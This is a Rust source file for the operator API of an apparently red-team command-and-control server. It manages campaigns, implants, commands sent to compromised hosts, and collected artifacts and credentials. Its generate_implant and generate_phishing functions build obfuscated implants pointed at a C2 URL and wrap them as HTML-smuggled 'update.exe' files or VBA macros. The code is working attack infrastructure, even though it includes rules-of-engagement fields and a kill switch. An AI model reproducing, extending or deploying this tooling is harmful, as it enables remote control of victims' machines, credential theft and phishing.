use crate::database::Database;
use crate::governance::GovernanceEngine;
use crate::services::session::SessionManager;
use crate::services::listener::ListenerManager;
use crate::wraith::redops::operator_service_server::OperatorService;
use crate::wraith::redops::*;
use std::sync::Arc;
use tokio::sync::broadcast;
use tonic::{Request, Response, Status};
use wraith_crypto::noise::NoiseKeypair;

pub struct OperatorServiceImpl {
    pub db: Arc<Database>,
    pub event_tx: broadcast::Sender<Event>,
    #[allow(dead_code)]
    pub governance: Arc<GovernanceEngine>,
    #[allow(dead_code)]
    pub static_key: Arc<NoiseKeypair>,
    #[allow(dead_code)]
    pub sessions: Arc<SessionManager>,
    pub listener_manager: Arc<ListenerManager>,
}

fn extract_operator_id<T>(req: &Request<T>) -> Result<String, Status> {
    if let Some(claims) = req.extensions().get::<crate::utils::Claims>() {
        return Ok(claims.sub.clone());
    }
    
    // If no claims found in extensions, check if we have a direct header (fallback/test)
    // or return error. Since interceptor handles verification, absence means unauthenticated.
    Err(Status::unauthenticated("Authentication required: Missing valid token"))
}

#[tonic::async_trait]
impl OperatorService for OperatorServiceImpl {
    type StreamEventsStream = tokio_stream::wrappers::ReceiverStream<Result<Event, Status>>;
    type DownloadArtifactStream =
        tokio_stream::wrappers::ReceiverStream<Result<ArtifactChunk, Status>>;
    type GenerateImplantStream =
        tokio_stream::wrappers::ReceiverStream<Result<PayloadChunk, Status>>;
    type GeneratePhishingStream = 
        tokio_stream::wrappers::ReceiverStream<Result<PayloadChunk, Status>>;

    async fn authenticate(
        &self,
        req: Request<AuthRequest>,
    ) -> Result<Response<AuthResponse>, Status> {
        let req = req.into_inner();

        // Lookup operator
        let op_model = self
            .db
            .get_operator_by_username(&req.username)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or(Status::unauthenticated("Invalid credentials"))?;

        // Verify signature
        // The signature must be over the username bytes to prove possession of the private key
        if req.signature.is_empty() {
            return Err(Status::unauthenticated("Missing signature"));
        }

        let vk_bytes: [u8; 32] = op_model.public_key.clone().try_into()
            .map_err(|_| Status::internal("Stored operator public key is invalid (not 32 bytes)"))?;

        let vk = wraith_crypto::signatures::VerifyingKey::from_bytes(&vk_bytes)
            .map_err(|_| Status::internal("Failed to parse operator public key"))?;

        let sig = wraith_crypto::signatures::Signature::from_slice(&req.signature)
            .map_err(|_| Status::unauthenticated("Invalid signature format (must be 64 bytes)"))?;

        vk.verify(req.username.as_bytes(), &sig)
            .map_err(|_| Status::unauthenticated("Invalid signature"))?;

        let token = crate::utils::create_jwt(&op_model.id.to_string(), &op_model.role)
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(AuthResponse {
            token,
            expires_at: Some(prost_types::Timestamp::from(
                std::time::SystemTime::now() + std::time::Duration::from_secs(3600),
            )),
            operator: Some(Operator {
                id: op_model.id.to_string(),
                username: op_model.username,
                display_name: op_model.display_name.unwrap_or_default(),
                role: op_model.role,
                last_active: None,
            }),
        }))
    }

    async fn refresh_token(
        &self,
        req: Request<RefreshRequest>,
    ) -> Result<Response<AuthResponse>, Status> {
        let req = req.into_inner();

        // Verify the existing token (even if expired, though create_jwt sets exp)
        let claims = crate::utils::verify_jwt(&req.token)
            .map_err(|e| Status::unauthenticated(format!("Invalid or expired token: {}", e)))?;

        let user_id = uuid::Uuid::parse_str(&claims.sub)
            .map_err(|_| Status::unauthenticated("Invalid subject in token"))?;

        let op_model = self
            .db
            .get_operator(user_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or(Status::unauthenticated("User not found"))?;

        let token = crate::utils::create_jwt(&op_model.id.to_string(), &op_model.role)
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(AuthResponse {
            token,
            expires_at: Some(prost_types::Timestamp::from(
                std::time::SystemTime::now() + std::time::Duration::from_secs(3600),
            )),
            operator: Some(Operator {
                id: op_model.id.to_string(),
                username: op_model.username,
                display_name: op_model.display_name.unwrap_or_default(),
                role: op_model.role,
                last_active: None,
            }),
        }))
    }

    async fn create_campaign(
        &self,
        req: Request<CreateCampaignRequest>,
    ) -> Result<Response<Campaign>, Status> {
        let req = req.into_inner();
        let camp = self
            .db
            .create_campaign(&req.name, &req.description)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Audit Log
        let _ = self
            .db
            .log_activity(
                None,
                None,
                "create_campaign",
                serde_json::json!({ "name": camp.name, "id": camp.id }),
                true,
            )
            .await;

        Ok(Response::new(Campaign {
            id: camp.id.to_string(),
            name: camp.name,
            description: camp.description.unwrap_or_default(),
            status: camp.status.unwrap_or_default(),
            start_date: None, // conversion needed
            end_date: None,
            roe: None,
            implant_count: 0,
            active_implant_count: 0,
        }))
    }

    async fn get_campaign(
        &self,
        req: Request<GetCampaignRequest>,
    ) -> Result<Response<Campaign>, Status> {
        let req = req.into_inner();
        let id =
            uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let c = self
            .db
            .get_campaign(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(Campaign {
            id: c.id.to_string(),
            name: c.name,
            description: c.description.unwrap_or_default(),
            status: c.status.unwrap_or_default(),
            start_date: None,
            end_date: None,
            roe: None,
            implant_count: 0,
            active_implant_count: 0,
        }))
    }

    async fn list_campaigns(
        &self,
        _req: Request<ListCampaignsRequest>,
    ) -> Result<Response<ListCampaignsResponse>, Status> {
        let campaigns = self
            .db
            .list_campaigns()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let list = campaigns
            .into_iter()
            .map(|c| Campaign {
                id: c.id.to_string(),
                name: c.name,
                description: c.description.unwrap_or_default(),
                status: c.status.unwrap_or_default(),
                start_date: None,
                end_date: None,
                roe: None,
                implant_count: 0,
                active_implant_count: 0,
            })
            .collect();

        Ok(Response::new(ListCampaignsResponse {
            campaigns: list,
            next_page_token: "".to_string(),
        }))
    }

    async fn update_campaign(
        &self,
        req: Request<UpdateCampaignRequest>,
    ) -> Result<Response<Campaign>, Status> {
        let req = req.into_inner();
        let id =
            uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let name_opt = if req.name.is_empty() {
            None
        } else {
            Some(req.name.as_str())
        };
        let desc_opt = if req.description.is_empty() {
            None
        } else {
            Some(req.description.as_str())
        };
        let status_opt = if req.status.is_empty() {
            None
        } else {
            Some(req.status.as_str())
        };

        let c = self
            .db
            .update_campaign(id, name_opt, desc_opt, status_opt)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(Campaign {
            id: c.id.to_string(),
            name: c.name,
            description: c.description.unwrap_or_default(),
            status: c.status.unwrap_or_default(),
            start_date: None,
            end_date: None,
            roe: None,
            implant_count: 0,
            active_implant_count: 0,
        }))
    }

    async fn list_implants(
        &self,
        _req: Request<ListImplantsRequest>,
    ) -> Result<Response<ListImplantsResponse>, Status> {
        let implants = self
            .db
            .list_implants()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let list = implants
            .into_iter()
            .map(|i| Implant {
                id: i.id.to_string(),
                campaign_id: i.campaign_id.unwrap_or_default().to_string(),
                hostname: i.hostname.unwrap_or_default(),
                internal_ip: i.internal_ip.map(|ip| ip.to_string()).unwrap_or_default(),
                external_ip: i.external_ip.map(|ip| ip.to_string()).unwrap_or_default(),
                os_type: i.os_type.unwrap_or_default(),
                os_version: i.os_version.unwrap_or_default(),
                architecture: i.architecture.unwrap_or_default(),
                username: i.username.unwrap_or_default(),
                domain: i.domain.unwrap_or_default(),
                privileges: i.privileges.unwrap_or_default(),
                implant_version: i.implant_version.unwrap_or_default(),
                first_seen: None, // Need timestamp conversion
                last_checkin: None,
                checkin_interval: i.checkin_interval.unwrap_or(0),
                jitter_percent: i.jitter_percent.unwrap_or(0),
                status: i.status.unwrap_or_default(),
                interfaces: vec![],
                metadata: std::collections::HashMap::new(),
            })
            .collect();

        Ok(Response::new(ListImplantsResponse {
            implants: list,
            next_page_token: "".to_string(),
        }))
    }

    async fn get_implant(
        &self,
        req: Request<GetImplantRequest>,
    ) -> Result<Response<Implant>, Status> {
        let req = req.into_inner();
        let id =
            uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let i = self
            .db
            .get_implant(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(Implant {
            id: i.id.to_string(),
            campaign_id: i.campaign_id.unwrap_or_default().to_string(),
            hostname: i.hostname.unwrap_or_default(),
            internal_ip: i.internal_ip.map(|ip| ip.to_string()).unwrap_or_default(),
            external_ip: i.external_ip.map(|ip| ip.to_string()).unwrap_or_default(),
            os_type: i.os_type.unwrap_or_default(),
            os_version: i.os_version.unwrap_or_default(),
            architecture: i.architecture.unwrap_or_default(),
            username: i.username.unwrap_or_default(),
            domain: i.domain.unwrap_or_default(),
            privileges: i.privileges.unwrap_or_default(),
            implant_version: i.implant_version.unwrap_or_default(),
            first_seen: None,
            last_checkin: None,
            checkin_interval: i.checkin_interval.unwrap_or(0),
            jitter_percent: i.jitter_percent.unwrap_or(0),
            status: i.status.unwrap_or_default(),
            interfaces: vec![],
            metadata: std::collections::HashMap::new(),
        }))
    }

    async fn kill_implant(&self, req: Request<KillImplantRequest>) -> Result<Response<()>, Status> {
        // Fail fast if configuration is missing
        let port_str = std::env::var("KILLSWITCH_PORT").expect("KILLSWITCH_PORT must be set");
        let port = port_str.parse().expect("KILLSWITCH_PORT must be a valid u16");
        let secret = std::env::var("KILLSWITCH_SECRET").expect("KILLSWITCH_SECRET must be set");

        let req = req.into_inner();
        let id =
            uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        self.db
            .kill_implant(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Broadcast Kill Signal
        let _ = crate::services::killswitch::broadcast_kill_signal(port, secret.as_bytes()).await;

        Ok(Response::new(()))
    }

    async fn send_command(
        &self,
        req: Request<SendCommandRequest>,
    ) -> Result<Response<Command>, Status> {
        let operator_id = extract_operator_id(&req)?;
        let req = req.into_inner();
        let implant_id = uuid::Uuid::parse_str(&req.implant_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let cmd_id = self
            .db
            .queue_command(implant_id, &req.command_type, &req.payload)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Audit Log
        let _ = self
            .db
            .log_activity(
                None,
                Some(implant_id),
                "send_command",
                serde_json::json!({ "type": req.command_type, "cmd_id": cmd_id }),
                true,
            )
            .await;

        Ok(Response::new(Command {
            id: cmd_id.to_string(),
            implant_id: req.implant_id,
            operator_id,
            command_type: req.command_type,
            payload: req.payload,
            priority: req.priority,
            status: "pending".to_string(),
            created_at: None,
            timeout_seconds: req.timeout_seconds,
        }))
    }

    async fn get_command_result(
        &self,
        req: Request<GetCommandResultRequest>,
    ) -> Result<Response<CommandResult>, Status> {
        let req = req.into_inner();
        let id = uuid::Uuid::parse_str(&req.command_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let res = self
            .db
            .get_command_result(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        if let Some(r) = res {
            Ok(Response::new(CommandResult {
                id: r.id.to_string(),
                command_id: r.command_id.unwrap_or_default().to_string(),
                output: r.output.unwrap_or_default(),
                exit_code: r.exit_code.unwrap_or(0),
                error_message: r.error_message.unwrap_or_default(),
                execution_time_ms: r.execution_time_ms.unwrap_or(0),
                received_at: None,
            }))
        } else {
            Err(Status::not_found("Command result not found"))
        }
    }

    async fn list_commands(
        &self,
        req: Request<ListCommandsRequest>,
    ) -> Result<Response<ListCommandsResponse>, Status> {
        let req = req.into_inner();
        let implant_id = uuid::Uuid::parse_str(&req.implant_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let commands = self
            .db
            .list_commands(implant_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let list = commands
            .into_iter()
            .map(|c| Command {
                id: c.id.to_string(),
                implant_id: c.implant_id.unwrap_or_default().to_string(),
                operator_id: c.operator_id.map(|o| o.to_string()).unwrap_or_default(),
                command_type: c.command_type,
                payload: c.payload.unwrap_or_default(),
                priority: c.priority.unwrap_or(0),
                status: c.status.unwrap_or_default(),
                created_at: None,
                timeout_seconds: c.timeout_seconds.unwrap_or(0),
            })
            .collect();

        Ok(Response::new(ListCommandsResponse {
            commands: list,
            next_page_token: "".to_string(),
        }))
    }

    async fn cancel_command(
        &self,
        req: Request<CancelCommandRequest>,
    ) -> Result<Response<()>, Status> {
        let req = req.into_inner();
        let id = uuid::Uuid::parse_str(&req.command_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        self.db
            .cancel_command(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(()))
    }

    async fn stream_events(
        &self,
        _req: Request<StreamEventsRequest>,
    ) -> Result<Response<Self::StreamEventsStream>, Status> {
        let mut rx = self.event_tx.subscribe();
        let (tx, out_rx) = tokio::sync::mpsc::channel(100);

        tokio::spawn(async move {
            while let Ok(event) = rx.recv().await {
                if tx.send(Ok(event)).await.is_err() {
                    break;
                }
            }
        });

        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
            out_rx,
        )))
    }

    async fn list_artifacts(
        &self,
        _req: Request<ListArtifactsRequest>,
    ) -> Result<Response<ListArtifactsResponse>, Status> {
        let artifacts = self
            .db
            .list_artifacts()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let list = artifacts
            .into_iter()
            .map(|a| Artifact {
                id: a.id.to_string(),
                implant_id: a.implant_id.unwrap_or_default().to_string(),
                filename: a.filename.unwrap_or_default(),
                original_path: a.original_path.unwrap_or_default(),
                file_size: a.file_size.unwrap_or(0),
                mime_type: a.mime_type.unwrap_or_default(),
                collected_at: None,
                hash_sha256: a.file_hash_sha256.unwrap_or_default(),
            })
            .collect();

        Ok(Response::new(ListArtifactsResponse {
            artifacts: list,
            next_page_token: "".to_string(),
        }))
    }

    async fn download_artifact(
        &self,
        req: Request<DownloadArtifactRequest>,
    ) -> Result<Response<Self::DownloadArtifactStream>, Status> {
        let req = req.into_inner();
        let id = uuid::Uuid::parse_str(&req.artifact_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;

        let artifact = self
            .db
            .get_artifact(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Streaming implementation
        let (tx, rx) = tokio::sync::mpsc::channel(4);
        let content = artifact.content.unwrap_or_default();
        let artifact_id = artifact.id.to_string();

        tokio::spawn(async move {
            let chunk_size = 1024 * 64; // 64KB
            for (i, chunk) in content.chunks(chunk_size).enumerate() {
                let resp = ArtifactChunk {
                    artifact_id: artifact_id.clone(),
                    data: chunk.to_vec(),
                    offset: (i * chunk_size) as i64,
                    is_last: (i + 1) * chunk_size >= content.len(),
                };
                if tx.send(Ok(resp)).await.is_err() {
                    break;
                }
            }
        });

        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
            rx,
        )))
    }

    async fn list_credentials(
        &self,
        _req: Request<ListCredentialsRequest>,
    ) -> Result<Response<ListCredentialsResponse>, Status> {
        let creds = self
            .db
            .list_credentials()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let list = creds
            .into_iter()
            .map(|c| Credential {
                id: c.id.to_string(),
                implant_id: c.implant_id.unwrap_or_default().to_string(),
                source: c.source.unwrap_or_default(),
                credential_type: c.credential_type.unwrap_or_default(),
                domain: c.domain.unwrap_or_default(),
                username: c.username.unwrap_or_default(),
                collected_at: None,
                validated: c.validated.unwrap_or(false),
            })
            .collect();

        Ok(Response::new(ListCredentialsResponse {
            credentials: list,
            next_page_token: "".to_string(),
        }))
    }

    async fn create_listener(
        &self,
        req: Request<CreateListenerRequest>,
    ) -> Result<Response<Listener>, Status> {
        let req = req.into_inner();
        let config_json =
            serde_json::to_value(req.config).map_err(|e| Status::internal(e.to_string()))?;

        let listener = self
            .db
            .create_listener(&req.name, &req.r#type, &req.bind_address, config_json)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(Listener {
            id: listener.id.to_string(),
            name: listener.name,
            r#type: listener.r#type,
            bind_address: listener.bind_address,
            port: 0,
            status: listener.status,
            config: std::collections::HashMap::new(),
        }))
    }

    async fn list_listeners(
        &self,
        _req: Request<ListListenersRequest>,
    ) -> Result<Response<ListListenersResponse>, Status> {
        let listeners = self
            .db
            .list_listeners()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let list = listeners
            .into_iter()
            .map(|l| Listener {
                id: l.id.to_string(),
                name: l.name,
                r#type: l.r#type,
                bind_address: l.bind_address,
                port: 0,
                status: l.status,
                config: std::collections::HashMap::new(),
            })
            .collect();

        Ok(Response::new(ListListenersResponse { listeners: list }))
    }

    async fn start_listener(
        &self,
        req: Request<ListenerActionRequest>,
    ) -> Result<Response<Listener>, Status> {
        let req = req.into_inner();
        let id = uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Bad ID"))?;

        // Retrieve listener config from DB
        let listener_model = self
            .db
            .get_listener(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or(Status::not_found("Listener not found"))?;

        // Start it via manager
        // Default port if not in config? Assuming stored in DB or config
        let port = 8080; // Placeholder: Need to store port in DB
        
        self.listener_manager.start_listener(
            &listener_model.id.to_string(),
            &listener_model.r#type,
            &listener_model.bind_address,
            port // TODO: Get port from model/config
        ).await.map_err(|e| Status::internal(e))?;

        self.db
            .update_listener_status(id, "active")
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(Listener {
            id: req.id,
            name: listener_model.name,
            r#type: listener_model.r#type,
            bind_address: listener_model.bind_address,
            port: port as i32,
            status: "active".to_string(),
            config: std::collections::HashMap::new(),
        }))
    }

    async fn stop_listener(
        &self,
        req: Request<ListenerActionRequest>,
    ) -> Result<Response<Listener>, Status> {
        let req = req.into_inner();
        let id = uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Bad ID"))?;

        // Stop via manager
        self.listener_manager.stop_listener(&req.id)
            .await
            .map_err(|e| Status::internal(e))?;

        self.db
            .update_listener_status(id, "stopped")
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Re-fetch to return
        let listener_model = self.db.get_listener(id).await.map_err(|e| Status::internal(e.to_string()))?.unwrap();

        Ok(Response::new(Listener {
            id: req.id,
            name: listener_model.name,
            r#type: listener_model.r#type,
            bind_address: listener_model.bind_address,
            port: 0,
            status: "stopped".to_string(),
            config: std::collections::HashMap::new(),
        }))
    }

    async fn generate_implant(
        &self,
        req: Request<GenerateImplantRequest>,
    ) -> Result<Response<Self::GenerateImplantStream>, Status> {
        let req = req.into_inner();

        // Validation
        if req.platform != "linux" && req.platform != "windows" {
            return Err(Status::invalid_argument("Unsupported platform"));
        }

        // Assume template exists
        let template_name = if req.platform == "windows" {
            "spectre.exe"
        } else {
            "spectre"
        };
        let template_path = std::path::Path::new("payloads").join(template_name);

        if !template_path.exists() {
            return Err(Status::failed_precondition("Implant template not found"));
        }

        let output_dir = std::env::temp_dir();
        let output_path = output_dir.join(format!("spectre_{}.bin", uuid::Uuid::new_v4()));

        // Builder Logic: Compile from source if requested, otherwise patch template
        if req.platform == "linux-src" || req.platform == "windows-src" {
            // Assume source is available relative to CWD
            let source_dir = std::path::Path::new("../spectre-implant");
            if !source_dir.exists() {
                return Err(Status::failed_precondition("Implant source code not found"));
            }
            
            crate::builder::Builder::compile_implant(
                source_dir,
                &output_path,
                &req.c2_url,
                &[], // No special features
                true // Obfuscate by default
            ).map_err(|e| Status::internal(format!("Compilation failed: {}", e)))?;
        } else if req.platform == "phishing-html" {
            // Generate payload then wrap in HTML
            crate::builder::Builder::patch_implant(
                &template_path,
                &output_path,
                &req.c2_url,
                req.sleep_interval as u64,
            ).map_err(|e| Status::internal(format!("Payload build failed: {}", e)))?;
            
            let payload = std::fs::read(&output_path).map_err(|e| Status::internal(e.to_string()))?;
            let html = crate::builder::phishing::PhishingGenerator::generate_html_smuggling(&payload, "update.exe");
            std::fs::write(&output_path, html).map_err(|e| Status::internal(e.to_string()))?;
        } else if req.platform == "phishing-macro" {
            // Generate payload then wrap in VBA
            crate::builder::Builder::patch_implant(
                &template_path,
                &output_path,
                &req.c2_url,
                req.sleep_interval as u64,
            ).map_err(|e| Status::internal(format!("Payload build failed: {}", e)))?;
            
            let payload = std::fs::read(&output_path).map_err(|e| Status::internal(e.to_string()))?;
            let vba = crate::builder::phishing::PhishingGenerator::generate_macro_vba(&payload);
            std::fs::write(&output_path, vba).map_err(|e| Status::internal(e.to_string()))?;
        } else {
            // Patch existing template
            crate::builder::Builder::patch_implant(
                &template_path,
                &output_path,
                &req.c2_url,
                req.sleep_interval as u64,
            )
            .map_err(|e| Status::internal(format!("Build failed: {}", e)))?;
        }

        // Stream back
        let (tx, rx) = tokio::sync::mpsc::channel(4);

        tokio::spawn(async move {
            if let Ok(content) = tokio::fs::read(&output_path).await {
                let chunk_size = 64 * 1024;
                for (i, chunk) in content.chunks(chunk_size).enumerate() {
                    let resp = PayloadChunk {
                        data: chunk.to_vec(),
                        offset: (i * chunk_size) as i64,
                        is_last: (i + 1) * chunk_size >= content.len(),
                    };
                    if tx.send(Ok(resp)).await.is_err() {
                        break;
                    }
                }
                // Cleanup
                let _ = tokio::fs::remove_file(output_path).await;
            } else {
                let _ = tx
                    .send(Err(Status::internal("Failed to read generated payload")))
                    .await;
            }
        });

        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
            rx,
        )))
    }

    async fn generate_phishing(
        &self,
        req: Request<GeneratePhishingRequest>,
    ) -> Result<Response<Self::GeneratePhishingStream>, Status> {
        let req = req.into_inner();
        let template_path = std::path::Path::new("payloads").join("spectre.exe");
        if !template_path.exists() {
            return Err(Status::failed_precondition("Spectre template not found"));
        }
        
        let output_dir = std::env::temp_dir();
        let payload_path = output_dir.join(format!("raw_{}.bin", uuid::Uuid::new_v4()));
        let final_path = output_dir.join(format!("phish_{}.out", uuid::Uuid::new_v4()));
        
        crate::builder::Builder::patch_implant(
            &template_path,
            &payload_path,
            &req.c2_url,
            5 
        ).map_err(|e| Status::internal(format!("Payload generation failed: {}", e)))?;
        
        let raw_bytes = std::fs::read(&payload_path).map_err(|e| Status::internal(e.to_string()))?;
        
        let content = if req.r#type == "html" {
            crate::builder::phishing::PhishingGenerator::generate_html_smuggling(&raw_bytes, "update.exe")
        } else if req.r#type == "macro" {
            crate::builder::phishing::PhishingGenerator::generate_macro_vba(&raw_bytes)
        } else {
            return Err(Status::invalid_argument("Unknown phishing type"));
        };
        
        std::fs::write(&final_path, content).map_err(|e| Status::internal(e.to_string()))?;
        let _ = std::fs::remove_file(payload_path);

        let (tx, rx) = tokio::sync::mpsc::channel(4);
        tokio::spawn(async move {
            if let Ok(data) = tokio::fs::read(&final_path).await {
                let chunk_size = 64 * 1024;
                for (i, chunk) in data.chunks(chunk_size).enumerate() {
                    let resp = PayloadChunk {
                        data: chunk.to_vec(),
                        offset: (i * chunk_size) as i64,
                        is_last: (i + 1) * chunk_size >= data.len(),
                    };
                    let _ = tx.send(Ok(resp)).await;
                }
                let _ = tokio::fs::remove_file(final_path).await;
            } else {
                let _ = tx.send(Err(Status::internal("Failed to read output"))).await;
            }
        });

        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(rx)))
    }

    async fn list_persistence(
        &self,
        req: Request<ListPersistenceRequest>,
    ) -> Result<Response<ListPersistenceResponse>, Status> {
        let req = req.into_inner();
        let implant_id = uuid::Uuid::parse_str(&req.implant_id)
            .map_err(|_| Status::invalid_argument("Invalid UUID"))?;
            
        let items = self.db.list_persistence(implant_id).await
            .map_err(|e| Status::internal(e.to_string()))?;
            
        let list = items.into_iter().map(|p| PersistenceItem {
            id: p.id.to_string(),
            implant_id: p.implant_id.unwrap_or_default().to_string(),
            method: p.method,
            details: p.details,
            created_at: None, 
        }).collect();
        
        Ok(Response::new(ListPersistenceResponse { items: list }))
    }

    async fn remove_persistence(
        &self,
        req: Request<RemovePersistenceRequest>,
    ) -> Result<Response<()>, Status> {
        let req = req.into_inner();
        let id = uuid::Uuid::parse_str(&req.id).map_err(|_| Status::invalid_argument("Invalid UUID"))?;
        self.db.remove_persistence(id).await.map_err(|e| Status::internal(e.to_string()))?;
        Ok(Response::new(()))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tonic::metadata::MetadataValue;
    use std::str::FromStr;

    #[test]
    fn test_extract_operator_id_success() {
        unsafe {
            std::env::set_var("JWT_SECRET", "test_secret_key_must_be_long_enough_32_chars");
        }
        
        let user_id = "550e8400-e29b-41d4-a716-446655440000";
        let token = crate::utils::create_jwt(user_id, "admin").unwrap();
        
        let mut req = Request::new(());
        let claims = crate::utils::verify_jwt(&token).unwrap();
        req.extensions_mut().insert(claims);
        
        let val = MetadataValue::from_str(&format!("Bearer {}", token)).unwrap();
        req.metadata_mut().insert("authorization", val);

        let extracted = extract_operator_id(&req).unwrap();
        assert_eq!(extracted, user_id);
    }
}
